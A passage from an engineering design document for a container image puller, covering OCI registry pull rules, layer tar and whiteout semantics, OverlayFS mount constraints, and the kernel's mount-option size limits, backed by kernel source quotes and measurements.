**Trap.** The bucket is per IP (or per IPv6 /64), so a CI fleet behind one NAT shares one
bucket — the most common real-world pull failure, and the reason a token cache is not optional.

**Trap.** A cache-validation `HEAD` must carry the **same full `Accept` list** as the `GET`, or
`ghcr.io` and Google Artifact Registry will `404` it — and a `404` on a cache-validation HEAD
reads as "the tag was deleted".

### 9.11 What an MVP puller may skip

**Recommendation.** Skip all of the following; none changes the store layout or the extracted
bytes, so adding them later is additive:

| Skipped | Why it is safe |
|---|---|
| `tags/list` and its pagination | Not needed to pull a named reference. When added, the termination condition is **"no `Link: …; rel=next` header"**, never "fewer than `n` results" — the spec says so explicitly (`spec.md#L543-L565`) because older registries omitted `Link` |
| `referrers` (`end-12a`/`12b`) | Nothing in a pull needs it. Live on Hub and returns a valid empty index for `alpine`. When added, it is **two** endpoints: a `404` from the referrers API triggers a **MUST** fallback to the `<alg>-<ref>` tag schema |
| `_catalog` | **Not an OCI endpoint at all** — zero occurrences in `distribution-spec@v1.1.1`. It is a Docker Registry v2 convention OCI declined to standardise, and Hub refuses it anonymously (`registry:catalog:*` scope). Do not even list it as deferred |
| Push (`end-4` … `end-7`, `end-11`), `DELETE` (`end-9`, `end-10`) | Out of scope, and `DELETE` is explicitly optional for registries |
| `tar+zstd` | Registered since image-spec v1.1 and producible by BuildKit, but seven images sampled across Hub, `ghcr.io` and `quay.io` in October 2026 were **all** `+gzip`. Classifying layer types by media-type suffix (`+gzip`, `+zstd`, bare `tar`) makes adding a decoder a one-line change |
| Authenticated registries, credential helpers | Anonymous pull reaches every image in the test corpus |
| Non-`sha256` digest algorithms | `sha512` is registered and optional; nothing serves it |

**Trap.** Two "correct on paper, useless in practice" orderings to avoid: validating against
the JSON schemas while failing on Docker media types (schema-valid, real-world broken), and
implementing `referrers` before `HEAD` (novel before useful).

### What this decides

| Decision | Urgency |
|---|---|
| Always send the full four-type `Accept` list; always classify by response type, never by request | **Urgent** — two of five registries `404` otherwise, one silently downgrades |
| Cached tag→digest records must store the `Accept` list that produced them | **Urgent** — it is a field in a persisted record; adding it later invalidates every cache entry |
| Pipeline order is classify → reject schema 1 → verify digest → parse | **Urgent** — the reverse order rejects manifests Hub serves correctly |
| Recompute every digest; treat `Docker-Content-Digest` as a hint and never abort on its absence | **Urgent** |
| Never forward `Authorization` across a cross-origin redirect, enforced by policy plus a test | **Urgent** — it works either way, so nothing else will catch its removal |
| Platform matching normalises before comparing; port `normalizeArch` | **Urgent** — ~25 lines, and the naive rule fails on our own architecture |
| Blob store keys on the compressed digest; extracted-layer store keys on ChainID; both, plus the index between them | **Urgent** — changing a store key later means every user re-downloads |
| Record the **index** digest for a tag, not the platform manifest digest | **Urgent** — it is persisted metadata |
| Decode the token and check its `access` claim before use | Deferrable — ~10 lines, converts a misleading `401` into a real error |
| Manifest `3xx` restarts the auth flow at the new origin, 5-hop cap | Deferrable — only `registry.k8s.io` needs it today |
| Rate-limit window from the token claim; `429` + `Retry-After` for control flow | Deferrable |

---

## 10. Root filesystem and layers

A stack of tar blobs becomes a working root filesystem in three steps: extract each blob into
its own directory, translate the archive's deletion markers into the kernel's, and mount the
directories as one overlay. Each step has a failure mode that is silent, and one of them
decides our minimum kernel version.

### 10.1 A layer is a tar changeset, and its blob digest is not reproducible

**Fact.** A layer is a "filesystem changeset" and changesets "are _applied_, rather than simply
extracted as tar archives" (`image-spec@v1.1.1/layer.md`). The archive format is tar; the spec
references the GNU basic tar format for the type flags (notably type `1` = hardlink) and
permits PAX extended headers.

**Fact — the "apply, don't extract" rules that bite.** From the same document:

- If the entry and the existing path are **both directories**, the existing path's attributes
  MUST be replaced by the entry's.
- Otherwise the implementation MUST do "the semantic equivalent of … removing the file path …
  recreating the file path". A file replacing a directory means **remove the directory tree
  first**, not merge.
- "Extracting a layer with hardlink references to files outside of the layer may fail."

**Fact — three rules that let us delete code rather than write it:**

| `layer.md` | Text | What it permits |
|---|---|---|
| `#L22` | Layer changesets "**MUST NOT** include duplicate entries for file paths" | **Reject** a duplicate path outright rather than resolving last-wins. A duplicate is the shape of a validate-then-replace attack |
| `#L62` | "Sparse files **SHOULD NOT** be used because they lack consistent support across tar implementations" | **Reject** GNU/PAX sparse entries and stay conformant. That deletes three incompatible `GNU.sparse.*` encodings from the attack surface |
| `#L54`, `#L56` | User name (`uname`) and group name (`gname`) "should be ignored on platforms that support User ID" | Ignoring PAX `uname`/`gname` is the spec's position, not just hygiene — a name lookup at extraction time is a host-identity leak |

**Fact.** Three layer media types are registered: `application/vnd.oci.image.layer.v1.tar`,
`…tar+gzip`, `…tar+zstd` (zstd added in image-spec v1.1). The three `…nondistributable…`
variants are marked deprecated at v1.1 and, with Docker's
`application/vnd.docker.image.rootfs.foreign.diff.tar.gzip`, name layers that are not in the
registry at all.

**Recommendation.** Classify layer types by media-type suffix — anything ending `+gzip` is
gzip, `+zstd` is zstd, a bare `…tar`/`…diff.tar` is uncompressed — and reject all four
foreign/nondistributable names with "Windows images are not supported". Reason: the suffix rule
is forward-compatible at zero cost; the explicit reject turns a `404` on a blob into a
comprehensible message.

**Fact — a compressed layer's blob digest is not reproducible across compressors.** Measured:
one 110 000-byte input, four compressors, sha256 of the gzip stream (first 16 hex):

```
python gzip (zlib) L6, mtime=0 : affcf52a90ca2c02
python gzip (zlib) L9, mtime=0 : 131e801f5a96c042
system gzip -6 -n              : ed189217de3234cf
system gzip -9 -n              : 78d0cb7691ac4959
```

Three independent axes diverge: compression **level**; the **implementation** at the same
nominal level (zlib `-6` and GNU gzip `-6` differ from identical input with identical header
fields, because the DEFLATE encoder's match/length choices differ); and the header **MTIME**.
The same library at the same level with `mtime=0` is byte-identical across runs. So gzip is
deterministic *per compressor build and settings*, and non-reproducible *across* them.
(BuildKit zeroes the gzip header — real layer blobs begin `1f8b 0800 0000 0000 00ff`, magic,
deflate, MTIME `00000000`, OS `ff` — which removes one axis of three.)

**Recommendation — never recompress a layer.** Store and forward the compressed bytes exactly
as received. Reason: re-gzipping the same tar produces a different blob digest, which breaks
the manifest, breaks any future push, and breaks cross-registry copy. The corollary is
absolute: **our content-addressed store may never key on the compressed digest of anything we
produced** — not even by matching BuildKit's zeroed header, because we would also have to match
zlib's exact version and settings. The only compressed digests we may treat as authoritative
are the ones that arrived over the wire. Tradeoff: no storage "optimisation" by recompressing;
doing that means rewriting the manifest and config too, i.e. building a new image.

**Fact.** zstd makes reproducibility worse, not better: the frame header carries an optional
content size, a window descriptor and an optional dictionary id, so two encoders at "level 3"
differ structurally; `libzstd` changes its default parameter tables between releases; and
multi-threaded mode (`ZSTD_c_nbWorkers > 1`) splits the input into jobs and is not
byte-reproducible against single-threaded output at all.

**Recommendation.** Decompress zstd, never produce it.

**Observation — the canonical smoke-test image exercises almost none of the hazards below.**
`tar -tzvf` on a real `alpine` layer blob: 515 entries, ~8.7 MB uncompressed, directories,
regular files and many symlinks; **zero** setuid/setgid entries, **zero** device or char nodes,
**zero** PAX, GNU LongLink or sparse markers. "It works on alpine" is not evidence of a safe
extractor.

### 10.2 Whiteouts, in two incompatible representations

A deletion is encoded one way in the tar and a different way on the filesystem, and translating
between them is the extractor's most under-appreciated job.

**Fact — the tar side** (`image-spec@v1.1.1/layer.md`, verified verbatim):

- "A whiteout file is an empty file with a special filename that signifies a path should be
  deleted" (`#L247`).
- "A whiteout filename consists of the prefix `.wh.` plus the basename of the path to be
  deleted" (`#L248`).
- "it is not possible to create a filesystem which has a file or directory with a name
  beginning with `.wh.`" (`#L249`).
- "Once a whiteout is applied, the whiteout itself MUST also be hidden" (`#L250`).
- "Whiteout files MUST only apply to resources in lower/parent layers" (`#L251`).
- An opaque whiteout is the entry `.wh..wh..opq`, "indicating that all siblings are hidden in
  the lower layer" (`#L279`), hiding "_all_ children … including sub-directories and all
  descendants" (`#L301`).
- Ordering: the opaque marker is "applied first, before creating the new version of `a/b`,
  **regardless of the ordering** in which the whiteout file was encountered" (`#L336`).
- "Implementations SHOULD generate layers using _explicit whiteout_ files, but MUST accept
  both" (`#L315`).

**Trap.** The widely-repeated sentence *"A `.wh.` file, without a basename to delete, is
invalid and implementations SHOULD return an error"* **is not in `layer.md`** at v1.0.2,
v1.1.0 or v1.1.1. Rejecting a bare `.wh.` entry is obviously right, but it is **our policy**,
not a spec SHOULD, and no conformance argument may rest on it.

**Fact — the OverlayFS side** (`Documentation/filesystems/overlayfs.rst`, `torvalds/linux@v6.11`):
a whiteout is "created as a character device with 0/0 device number or as a zero-size regular
file with the xattr `trusted.overlay.whiteout`"; an opaque directory is marked by "setting the
xattr `trusted.overlay.opaque` to `'y'`"; with `-o userxattr` the prefix becomes
`user.overlay.`; and `opaque="x"` marks a "whiteout base" directory used when overlay is
stacked on overlay.

**Fact — the translation:**

| Tar entry in a layer | What must appear in the layer's own diff directory |
|---|---|
| `path/.wh.name` (regular file, size 0) | `mknodat(dirfd, "path/name", S_IFCHR\|0000, makedev(0,0))`, and **do not** create `.wh.name` |
| `path/.wh..wh..opq` | `fsetxattr(dirfd_of_path, "trusted.overlay.opaque", "y", 1, 0)` — or `user.overlay.opaque` under `userxattr` — and do not create the file |
| `.wh.` with an empty basename | error out (our policy) |
| anything else | extract normally |

**Observation.** The representation is confirmed by construction, not only by documentation: on
kernel 6.11.0-29, `rm -rf` of a lower-only directory through a user-namespace overlay leaves
`c--------- 2 root root 0, 0 … d` in the upper directory — a character device, major 0, minor
0, mode 000.

**Fact — creating a whiteout device needs no privilege, and the exemption is generic VFS code.**
`torvalds/linux@v6.11/fs/namei.c#L4063-4074`:

```c
int vfs_mknod(struct mnt_idmap *idmap, struct inode *dir,
	      struct dentry *dentry, umode_t mode, dev_t dev)
{
	bool is_whiteout = S_ISCHR(mode) && dev == WHITEOUT_DEV;
	int error = may_create(idmap, dir, dentry);

	if (error)
		return error;

	if ((S_ISCHR(mode) || S_ISBLK(mode)) && !is_whiteout &&
	    !capable(CAP_MKNOD))
		return -EPERM;
```

Three consequences, each load-bearing:

1. The check sits in `vfs_mknod`, **above** `dir->i_op->mknod`, so it is not
   filesystem-specific — any filesystem implementing `mknod` inherits the exemption.
2. The guard is `capable()`, **not** `ns_capable()` — i.e. against the **initial** user
   namespace. A userns-root process holds `CAP_MKNOD` in its own namespace and it does not
   help. The whiteout exemption is the only way a process outside the initial userns ever
   creates a character device.
3. `may_create()` still runs first: ordinary write permission on the parent directory is still
   required. It is an exemption from `CAP_MKNOD`, not from DAC.

**Observation.** Measured in the hardest configuration — a genuinely unprivileged uid in the
**initial** user namespace with `CapPrm`/`CapEff` both zero
(`setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all`), on two filesystems:

```
-- /tmp (tmpfs) --              -- /var/tmp (ext4) --
mknod c 0 0 -> OK               mknod c 0 0 -> OK
mknod c 1 1 -> EPERM            mknod c 1 1 -> EPERM
mknod b 0 0 -> EPERM            mknod b 0 0 -> EPERM
mkfifo      -> OK               mkfifo      -> OK
```

Identical as userns-root. **A rootless extractor can create overlay whiteouts natively.** Do
not reach for `fuse-overlayfs` merely because of whiteouts.

**Fact — the opaque half is the opposite.** `trusted.*` extended attributes require
`CAP_SYS_ADMIN` in the **initial** user namespace (`xattr(7)`: "Trusted extended attributes are
visible and accessible only to processes that have the CAP_SYS_ADMIN capability"), which a user
namespace can never grant. `user.overlay.opaque` succeeds unprivileged.

**Fact — `userxattr` auto-selection is a vendor patch, not kernel behaviour.** In mainline
`torvalds/linux@v6.11`, `config->userxattr` is assigned in exactly one place —
`fs/overlayfs/params.c#L596-597`, `case Opt_userxattr: config->userxattr = true;` — i.e. only
when the option is passed. The only other mention in `super.c` is the hint
`pr_info("try mounting with 'userxattr' option\n")`. The observed auto-enable on Ubuntu
6.11.0-29 (`/proc/version_signature` → `Ubuntu 6.11.0-29.29-generic 6.11.11`) is an Ubuntu
SAUCE patch carried alongside Canonical's fixes for CVE-2023-2640 / CVE-2023-32629
("GameOver(lay)"). *(Source tier: Ubuntu kernel-team discussion for the patch's provenance; the
**absence** from mainline is established from source and is the part that matters.)*

**Recommendation.** Always pass `userxattr` explicitly when we are not CAP_SYS_ADMIN in the
initial user namespace, and never pass it when we are. This is load-bearing on **every** host,
not a belt-and-braces measure on one: a mainline, Debian, Fedora or Amazon Linux kernel will
not auto-select it, and `nouserxattr` is *accepted* inside a user namespace — the kernel will
cheerfully hand a rootless caller a `trusted.overlay.*` overlay that cannot write its own
xattrs and fails at the first directory removal. Tradeoff: the extracted layer store becomes
mode-specific, which is the next finding.

**Fact — layers are not portable across xattr modes, and the failure is silent.**

| Mount | Reads xattrs in | A rootless extractor can write | A layer extracted the other way |
|---|---|---|---|
| root, initial userns | `trusted.overlay.*` | — (we are root) | `user.overlay.opaque` is **ignored** → deleted directories reappear |
| userns, `userxattr` **passed** | `user.overlay.*` | `user.overlay.opaque` | `trusted.overlay.opaque` is **ignored** → same |
| userns, `userxattr` **not** passed | `trusted.overlay.*` | nothing (`EPERM`) | removing a lower-only directory → **`EIO`** |
| userns, Ubuntu auto-select | `user.overlay.*` | `user.overlay.opaque` | as row 2 |

The whiteout **device nodes are portable** — char 0:0 is namespace-independent — so only the
**opaque-directory markers** are not. A cross-mode layer therefore does not fail loudly; it
produces a filesystem in which a directory the Dockerfile deleted is visible again, with its
original contents.

**Recommendation.** Partition the extracted-layer store by **xattr namespace**, not by
privilege mode: `layers/trusted/<chainid>/` versus `layers/userxattr/<chainid>/`. Privilege
does not determine namespace on its own — the kernel's patch set does — so record the namespace
actually used at extraction time in the layer's metadata, and refuse to mount a layer whose
recorded namespace does not match the mount's. Tradeoff: root and rootless modes cannot share
extracted layers, doubling disk when both are used. Accept it; the alternative is a
wrong-filesystem bug that presents as "a file I deleted is back".

**Recommendation — do the translation at extraction time, once per layer, into the layer's own
diff directory.** The diff directory then *is* a valid overlay lower layer with no
post-processing, and the kernel enforces the whiteout semantics for free — including the
"apply opaque before siblings regardless of ordering" rule, because the xattr is a property of
the directory rather than an event in a stream. Tradeoff: the extracted diff is
overlay-specific rather than a portable tree, so a non-overlay backend needs its own merge
logic.

**Fact.** There is now a security argument for that choice as well. **CVE-2026-95838**
(published 2026-10-12, fixed in containerd 1.7.35 / 2.0.12 / 2.2.8 / 2.3.5): "containerd's
layer unpack handler repeatedly traverses directories for certain opaque whiteout
configurations. A malicious image layer can trigger repeated directory traversals while opaque
whiteouts are processed."

**Trap.** The obvious plain-tree algorithm — "record each opaque marker in a set, then at layer
end sweep the tree removing lower-only entries under each" — is exactly the vulnerable shape: a
layer with *k* nested markers makes it an O(k × tree) sweep over an attacker-chosen tree. The
overlay-native backend is structurally immune: one `fsetxattr` per marker, O(k), no traversal
at all.

**Recommendation.** In any plain-tree backend, collapse the opaque set to its minimal set of
non-nested prefixes, sweep each prefix exactly once, and bound the number of opaque markers per
layer under the same entry-count cap used for decompression limits.

### 10.3 OverlayFS mechanics, from the kernel's own source

**Fact — lowerdir ordering.** `overlayfs.rst#L347-349`: "The specified lower directories will
be stacked beginning from the rightmost one and going left. In the above example lower1 will be
the top, lower2 the middle and lower3 the bottom layer." So `lowerdir=A:B:C` makes **A the
topmost lower layer** and C the bottom, with `upperdir` above all of them. Measured on kernel
6.11.0-29 with two lower dirs each containing a file `f`: `lowerdir=oa:ob` reads `oa`'s
content; `lowerdir=ob:oa` reads `ob`'s. The same rule applies to repeated `lowerdir+` on the
new mount API: the **first** call is the topmost layer.

**Recommendation.** Build the lower list by **reversing** the manifest's layer order:
`lowerdir = layers[n-1] : layers[n-2] : … : layers[0]`. Write one assertion test that extracts
two layers where the upper overwrites a file, mounts, and reads it — and a reversed-order
variant that must fail. Five minutes, and it catches the single most consequential one-line bug
in the project.

**Fact — `upperdir` and `workdir` must share a *mount*, not merely a filesystem.**
`torvalds/linux@v6.11/fs/overlayfs/super.c#L789-793`:

```c
	if (upperpath->mnt != workpath->mnt) {
		pr_err("workdir and upperdir must reside under the same mount\n");
		return err;
	}
```

**Trap.** Checking `st_dev` or `statfs.f_fsid` accepts configurations the kernel rejects: a
`mount --bind` gives two `vfsmount`s over one filesystem with identical `st_dev`, and the mount
then fails. Measured: upper at `/tmp/v4r/u`, work at `/tmp/v4r/w`, same tmpfs, different
`vfsmount` via a bind — **FAIL**.

**Recommendation.** Compare the **mount id**: `statx(STATX_MNT_ID)` (Linux 5.8+), or the mount-id
field in `/proc/self/mountinfo` for each path. Check it ourselves before the syscall, because
all five distinct upper/work misuses produce the *same* opaque `EINVAL`
("wrong fs type, bad option, bad superblock") and the real reason appears only in `dmesg`.

**Fact.** `workdir` and `upperdir` must also be separate subtrees — `super.c#L428-440`
("Workdir should not be subdir of upperdir and vice versa", implemented with `lock_rename()`
returning a trap dentry) and `#L794-797`. Measured: workdir inside upperdir, upperdir inside
workdir, and workdir equal to upperdir are all rejected.

**Fact.** `workdir` exists so overlay can perform copy-up and whiteout creation atomically: it
creates the new object under `work/work/` and `rename`s it into place, and `rename(2)` is atomic
only within one filesystem — hence the same-mount rule.

**Trap.** "The workdir needs to be an empty directory" (`overlayfs.rst#L126`) is documentation,
not enforcement. Measured: a workdir pre-populated with three entries mounts fine; overlay
creates its own `work/` alongside the junk. Do not rely on `mount(2)` to catch a reused workdir
— a stale `work/` from a crashed run is exactly the state we will meet.

**Fact — a read-only overlay needs at least TWO lower layers.**
`torvalds/linux@v6.11/fs/overlayfs/super.c#L1123-1126`:

```c
	if (!ofs->config.upperdir && ctx->nr == 1) {
		pr_err("at least 2 lowerdir are needed while upperdir nonexistent\n");
		return ERR_PTR(-EINVAL);
	}
```

Measured: single lowerdir with no upper → FAIL; two lowerdirs with no upper → MOUNTED, reported
`ro`.

**Trap.** This bites on the very first image anyone tests: `alpine` has exactly **one** layer.
A `--read-only` container on a single-layer image, mounted the obvious way, fails with the
generic "wrong fs type, bad option, bad superblock".

**Recommendation.** For a read-only container, always supply an `upperdir` + `workdir` on a
`tmpfs` and make the mount read-only at the VFS level (`MS_RDONLY`, or `fsmount` with
`MOUNT_ATTR_RDONLY`). Reason: one code path for both modes, a real place for copy-up to fail
loudly, and it matches what the runtime spec's `root.readonly` means anyway. The alternative —
padding the lower list with an empty directory — works but adds a special case.

**Fact — duplicate and overlapping lower directories give `ELOOP`.** `ovl_setup_trap()`
(`super.c#L442`) installs a trap inode on every layer root, and a second use of the same dentry
hits it. Measured, three cases, all `ELOOP` ("Too many levels of symbolic links"): duplicate
lower (`oa:oa`), `lowerdir == upperdir`, and nested lowers (`oa:oa/nested`). The documented
policy (`overlayfs.rst#L490-499`): lower layers may be shared among several overlay mounts, but
reusing an upper or work path "is not allowed and may fail with EBUSY", and "Using partially
overlapping paths is not allowed."

**Recommendation.** Dedupe the lower list and reject any lower that is an ancestor or descendant
of another lower or of the upper. With ChainID-named directories under one store root this
cannot happen by accident — but it **can** happen deliberately, from a crafted image whose two
layers have identical `diff_id`s. Make it a check, not an assumption.

**Fact.** Overlay-on-overlay is one-directional. Measured: an overlay as the **lower** of
another overlay mounts; as the **upper** it fails. The nested-lower case is what the
`…overlay.opaque="x"` "whiteout base" marker exists for.

**Fact.** "The upper filesystem … must support the creation of `trusted.*` and/or `user.*`
extended attributes, and must provide valid `d_type` in `readdir` responses, so **NFS is not
suitable**" (`overlayfs.rst#L98-106`). A read-only overlay of read-only filesystems "may use
any filesystem type". NFS as a *lower* works.

**Unverified here.** An NFS `upperdir` reportedly returns **`EACCES`** — not `EINVAL` or
`EXDEV` — which will send a reader hunting for a permission problem. Settle it on a host with
an NFS mount: `strace -e trace=mount mount -t overlay overlay -o
lowerdir=/tmp/lo,upperdir=$NFS/u,workdir=$NFS/w /tmp/m`, and read the errno from the strace
line rather than `mount`'s message.

**Recommendation.** Probe the upper/work filesystem at startup rather than version-checking it:
try setting an xattr and reading `d_type`, and check `statfs.f_type` against a deny list. The
`f_type` check alone misses "ext4 mounted `nodev`"; the xattr probe alone misses the `d_type`
requirement.

**Fact — four feature options are hard-rejected in exactly the mode we want.** Measured inside
a user namespace on 6.11.0-29, fresh upper and work per test:

| option | result in a userns overlay |
|---|---|
| `userxattr` / `nouserxattr` | MOUNTED |
| `metacopy=on` | **REJECTED** |
| `redirect_dir=on` | **REJECTED** |
| `redirect_dir=off` | **REJECTED** |
| `redirect_dir=nofollow` | MOUNTED (the forced value) |
| `index=on`/`off`, `xino=on`/`off`, `nfs_export=on`, `volatile` | MOUNTED |
| `verity=require` | REJECTED |
| `index=off,nfs_export=on` / `metacopy=on,nfs_export=on` / `metacopy=on,redirect_dir=nofollow` | REJECTED (documented conflicts) |

The mechanism is explicit at `torvalds/linux@v6.11/fs/overlayfs/params.c#L886-902`: under
`userxattr`, `redirect_dir` other than `nofollow`, `metacopy=on` and any `verity_mode` each
return `-EINVAL` with a `pr_err` naming the conflict.

**Fact — and the security reasoning behind that rejection is ours.** `overlayfs.rst#L382-387`:
"Do not use metacopy=on with untrusted upper/lower directories. Otherwise it is possible that an
attacker can create a handcrafted file with appropriate REDIRECT and METACOPY xattrs, and gain
access to file on lower pointed by REDIRECT. This should not be possible on local system as
setting 'trusted.' xattrs will require CAP_SYS_ADMIN. **But it should be possible for untrusted
layers like from a pen drive.**"

**Trap.** The doc's own reason why this is "usually safe" — a layer cannot set
`trusted.overlay.*` without `CAP_SYS_ADMIN` — **collapses under `userxattr`**, where overlay
reads `user.overlay.*`, which any unprivileged process, and therefore any extracted layer, can
set. Our threat model is the pen-drive case, not the local-filesystem case.

**Recommendation.** Pass none of the feature options: take the kernel defaults plus `userxattr`
when unprivileged. The genuinely unsafe-with-untrusted-lowers set is `metacopy=on`,
`redirect_dir=on` and `redirect_dir=follow`, and the matching extractor-side rule — **never let
a layer set an `overlay.*` xattr directly** — is load-bearing rather than hygiene: a layer
shipping `trusted.overlay.opaque` could hide arbitrary lower content, and with `redirect_dir`
could alias a directory to another path. `index`, `xino` and `nfs_export` are
correctness/compatibility options with no equivalent lower-layer attack surface; `xino=on` is
the one worth revisiting early, because duplicate inode numbers across layers break `tar`,
`rsync -H` and `find -samefile` inside the container.

**Trap — `volatile` permanently poisons its workdir.** Measured: a `volatile` mount leaves
`work/incompat/volatile/dirty`, and every later **non**-volatile mount on that workdir fails
with the same opaque `EINVAL`, forever, until `work/incompat/` is removed. Combined with
"non-empty workdir is accepted", this is a real foot-gun. If we use `volatile` at all — it is
genuinely attractive for a throwaway extraction staging mount and genuinely wrong for a
container's rw layer — use a fresh workdir every time and remove it afterwards.

**Fact.** "In the old mount api the credentials of the task calling `mount(2)` are stashed. In
the new mount api the credentials of the task creating the superblock through
`FSCONFIG_CMD_CREATE` … are stashed" (`overlayfs.rst`, *Permission model*). The stashed
credentials are used for all later access to the lower layers, so we must not mount the overlay
from a more-privileged helper and hand it to a less-privileged container expecting the kernel
to re-check.

### 10.4 The headline result: the mount-option page, and how to escape it

**This is the finding that decides our storage design.** On a modern kernel we can mount an
arbitrarily layered image directly and never need the symlink-farm indirection that Docker's
`overlay2` driver exists to provide. Below that kernel, there is no escape at all.

**Fact — the legacy `mount(2)` options page is 4095 bytes and truncates silently.**
`copy_mount_options()` (`torvalds/linux@v6.11/fs/namespace.c#L3669-L3701`) `kmalloc`s one page
and copies into it; it does **not** NUL-terminate. The truncation is one frame up, in
`path_mount()` (`#L3736`):

```c
	/* Basic sanity checks */
	if (data_page)
		((char *)data_page)[PAGE_SIZE - 1] = 0;
```

One unconditional store of `'\0'` at byte 4095. No length check, no comparison, no error. Bytes
0–4094 survive; everything from byte 4095 on is gone.

**Observation — the boundary, measured on 6.11.0-29 by building a `lowerdir=` string of an
exact length:**

```
  valid lowerdir string of 4093 B -> OK      4096 B -> ENOENT
  valid lowerdir string of 4094 B -> OK      4200 B -> ENOENT
  valid lowerdir string of 4095 B -> OK
```

Not `E2BIG`, not `EINVAL`, not `ENAMETOOLONG` — **`ENOENT`**, because the last path in the list
was cut in half and the kernel looked up a directory that does not exist.

**Observation — the truncation is silent, proven rather than inferred.** Appending a
deliberately invalid option after N valid bytes: if the kernel sees it, `EINVAL`; if the mount
*succeeds*, the tail was discarded without complaint.

```
  valid 3000 B + ',ZZZZZZZZ'  -> EINVAL     (bogus option reached the parser)
  valid 4086 B + ',ZZZZZZZZ'  -> EINVAL     (ends exactly at 4095; still fully seen)
  valid 4090 B + ',ZZZZZZZZ'  -> EINVAL
  valid 4094 B + ',ZZZZZZZZ'  -> MOUNTED    (only the ',' fits; tail gone)
  valid 4095 B + ',ZZZZZZZZ'  -> MOUNTED    (entire tail discarded, no error)
  valid 4096 B + ',ZZZZZZZZ'  -> ENOENT     (truncation landed mid-path)
```

A `mount(2)` handed 4104 bytes of options, nine of them garbage, **returned 0**.

**Fact — `mount -o lowerdir+=` does *not* escape this.** `lowerdir+`/`datadir+` buy colon
escaping and append semantics; they buy nothing against the page limit, because util-linux
still issues a single `mount(2)`. Measured on util-linux 2.40.2 with
`strace -e trace=mount,fsopen,fsconfig,fsmount,move_mount,open_tree`, under every value of
`LIBMOUNT_FORCE_MOUNT2`:

```
mode=auto   mounted=yes  syscalls: 1 mount(
mode=never  mounted=yes  syscalls: 1 mount(
mode=always mounted=yes  syscalls: 1 mount(
```

One `mount(2)`, zero `fsopen`, in all three modes — and at 300 layers (a 7389-byte option
string) all three fail identically. Raw `mount(2)` with repeated `lowerdir+=` pairs behaves the
same: 60 layers (1559 B) OK, 150 (3899 B) OK, 300 (7799 B) `ENOENT`.

**Trap.** Any guidance that says "use `lowerdir+=` to get past the mount option limit" is wrong
unless it means genuine `fsconfig(2)` syscalls. A `mount(8)` command line is not an
implementation of the new mount API.

**Fact — genuine `fsconfig(2)` does escape it.** `fsopen("overlay")`, N ×
`fsconfig(fd, FSCONFIG_SET_STRING, "lowerdir+", <one path>, 0)`,
`fsconfig(fd, FSCONFIG_CMD_CREATE, …)`, `fsmount`, `move_mount(…, MOVE_MOUNT_F_EMPTY_PATH)`,
then `readdir` of the result. Measured on 6.11.0-29:

```
    2 lowerdir+ calls (=   32 B of paths) -> OK   files visible through mount: 2
  128 lowerdir+ calls (= 2048 B of paths) -> OK   files visible: 128
  200 lowerdir+ calls (= 3200 B of paths) -> OK   files visible: 200
  300 lowerdir+ calls (= 4800 B of paths) -> OK   files visible: 300
  300 lowers + upperdir + workdir         -> OK   files visible: 300   (read-write)
```

**300 layers, 4800 bytes of lower paths, every layer's file readable through the mount,
read-write with upper and work.** The 4095-byte page does not exist on this path. A lower
directory literally named `has:colon` also mounts, where classic `lowerdir=` gives `ENOENT`.

**Fact — the real ceiling is `OVL_MAX_STACK = 500`**
(`torvalds/linux@v6.11/fs/overlayfs/params.h#L20`), enforced per `lowerdir+` call
(`params.c#L305-307`) and as a post-split check on `lowerdir=` (`#L466-471`). Measured, with the
error string read back from the `fs_context` fd:

```
  480 lowers -> OK
  500 lowers -> OK
  501 lowers -> fsconfig lowerdir+ #501 EINVAL  ctx:['e overlay: too many lower directories, limit is 500']
```

**Fact — the feature arrived in kernel 6.7, and the kernel's own documentation is wrong about
it.** `overlayfs.rst` says "Since kernel version v6.8, directory names containing colons can
also be configured as lower layer using the `lowerdir+` mount options". The code is in
`torvalds/linux@v6.7/fs/overlayfs/params.c#L148` — commit `24e16e385f22`, "ovl: add support for
appending lowerdirs one by one" (2023-10-30), merged as `7f851936a0ca` under tag
`ovl-update-6.7`. Verified by diffing `params.c` across tags: `v6.6` has zero occurrences of
`lowerdir+`, `v6.7` has five, `v6.8` has five. The documentation sentence is already present
*in the v6.7 tree itself* — it was written while the series was aimed at the 6.8 merge window
and never corrected when it landed a cycle early.

**Trap — below 6.5, `fsopen("overlay")` does not fail; it silently falls back.** Overlayfs was
converted to the new mount API (`fs_context`) at **6.5** (`fs/overlayfs/super.c` first
references `init_fs_context` at v6.5, zero at v6.4). Below that, `fsopen` routes through the
legacy `fs_context` shim (`torvalds/linux@v6.11/fs/fs_context.c#L576-L629`), which reassembles
your `fsconfig` calls into exactly one comma-separated options page and enforces
`if (size + len + 2 > PAGE_SIZE) return invalf(fc, "VFS: Legacy: Cumulative options too
large");`. So on 5.2–6.4 the new mount API gives you the **same ~4094-byte ceiling** — with a
loud error instead of truncation, which is an improvement but not an escape.

**Fact — `fsconfig` does not remove the limit, it replaces it with two narrower ones, and one
of them is a trap.**

1. **Every `FSCONFIG_SET_STRING` value is capped at 255 bytes.**
   `torvalds/linux@v6.11/fs/fsopen.c#L430`: `param.string = strndup_user(_value, 256);` (and
   `#L417` the same for the key). Measured: a lower path of 255 bytes is accepted, 256 returns
   `EINVAL`. `PATH_MAX` is 4096; `fsconfig` gives you 255.
2. **There is no escape hatch.** `FSCONFIG_SET_PATH` — which uses `getname_flags`, i.e.
   `PATH_MAX` — is rejected by overlayfs, because `lowerdir+` is declared `fsparam_string`
   (`params.c#L144`) and `fs_param_is_string` accepts only `fs_value_is_string`. Measured:
   `FSCONFIG_SET_PATH lowerdir+ -> EINVAL ["e overlay: Bad value for 'lowerdir+'"]`.
3. **The aggregate `lowerdir=` form is far worse under `fsconfig` than under `mount(2)`.**
   Measured: `fsconfig lowerdir=` with a 43-byte string is accepted, 439 bytes gives `EINVAL` —
   the same 255-byte cap. So porting to the new API by moving an existing colon-joined string
   into one `FSCONFIG_SET_STRING` call takes you from 4095 bytes to 255, and **will pass a
   two-layer test**. `lowerdir+` is not an optimisation on the new API; it is the only usable
   form.

**The three ceilings, side by side:**

| Path | Per-path limit | Aggregate limit | Layer ceiling | Failure mode |
|---|---|---|---|---|
| `mount(2)`, `lowerdir=a:b:c` | `PATH_MAX` (4096) | **4095 B of options** | ~43 with raw 64-hex paths; ~145 with 28-byte short links | **silent truncation → `ENOENT`** |
| `mount(2)` or `mount(8)`, repeated `-o lowerdir+=` | `PATH_MAX` | **4095 B of options** | same | **silent truncation → `ENOENT`** |
